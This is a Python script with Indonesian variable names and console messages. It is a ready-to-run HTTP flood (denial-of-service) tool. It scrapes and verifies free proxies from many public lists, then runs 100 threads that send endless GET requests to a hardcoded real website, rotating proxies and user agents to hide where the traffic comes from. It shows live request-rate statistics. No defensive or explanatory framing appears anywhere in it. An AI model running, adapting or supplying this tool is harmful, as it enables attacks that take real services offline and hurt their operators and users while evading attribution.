import threading
import requests
import time
import random
import concurrent.futures
from rich.console import Console
from rich.table import Table
from rich.progress import track

threads = []
header = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/116.0.5845.110 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/116.0.5845.110 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/116.0.5845.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) seperti Gecko",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)"
]

console = Console()

def cek_proxy(proxy):
    try:
        response = requests.get("https://google.com", proxies={"http": proxy, "https": proxy}, timeout=2)
        return response.status_code == 200
    except Exception:
        return False

def muat_proxies():
    proxies = []
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://api.openproxylist.xyz/http.txt",
        "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
        "http://rootjazz.com/proxies/proxies.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
        "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
        "https://proxy-spider.com/api/proxies.example.txt",
        "https://multiproxy.org/txt_all/proxy.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        'https://openproxy.space/list/http',
        'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt',
        'https://raw.githubusercontent.com/almroot/proxylist/master/list.txt',
        'https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt',
        'https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt',
        'https://raw.githubusercontent.com/hanwayTech/free-proxy-list/main/http.txt',
        'https://raw.githubusercontent.com/hanwayTech/free-proxy-list/main/https.txt',
        'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
        'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
        'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt',
        'https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt',
        'https://proxyspace.pro/http.txt',
        'https://proxyspace.pro/https.txt'
    ]

    console.print("Memuat proxy dari beberapa sumber...")
    for url in urls:
        try:
            response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
            response.raise_for_status()
            daftar_proxy = response.text.splitlines()
            daftar_proxy = daftar_proxy[:10000]  # Batasi jumlah proxy yang diambil
            with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                futures = {executor.submit(cek_proxy, proxy): proxy for proxy in daftar_proxy}
                for future in track(concurrent.futures.as_completed(futures), description="Verifikasi proxy"):
                    proxy = futures[future]
                    if future.result():
                        proxies.append(proxy)
        except Exception as e:
            console.print(f"Kesalahan saat memuat proxy dari {url}: {e}")

    console.print("Proxy berhasil dimuat dan diverifikasi!")
    time.sleep(2)
    return proxies

jumlah_request = 0
waktu_mulai = time.time()

console = Console()

log_error = open("errors.log", "a")

def ambil(url, i):
    global jumlah_request
    while True:
        proxy = {'http': f'http://{random.choice(proxiess)}'}
        head = random.choice(header)
        try:
            response = requests.get(url, proxies=proxy, headers={'User-Agent': head})
            jumlah_request += 1
        except Exception as e:
            log_error.write(f"Kesalahan: {e}\n")

def perbarui_statistik():
    console.clear()
    global jumlah_request, waktu_mulai
    waktu_berlalu = time.time() - waktu_mulai
    permintaan_per_detik = jumlah_request / waktu_berlalu

    tabel = Table(title="Statistik")
    tabel.add_column("Permintaan", justify="right", style="cyan", no_wrap=True)
    tabel.add_column("Kecepatan (permintaan/detik) ", justify="right", style="magenta", no_wrap=True)
    tabel.add_column("Proxy", justify="right", style="green", no_wrap=True)
    tabel.add_row(str(jumlah_request), f"{permintaan_per_detik:.2f}", str(len(proxiess)))
    
    console.print(tabel)

if True:
    url = "https://alfalearning.sat.co.id"  # Set your URL here
    th = 100  # Set the number of threads here
    proxiess = muat_proxies()
    for i in range(th):
        thread = threading.Thread(target=ambil, args=(url, i,))
        threads.append(thread)
        thread.start()

    while True:
        perbarui_statistik()
        time.sleep(1)
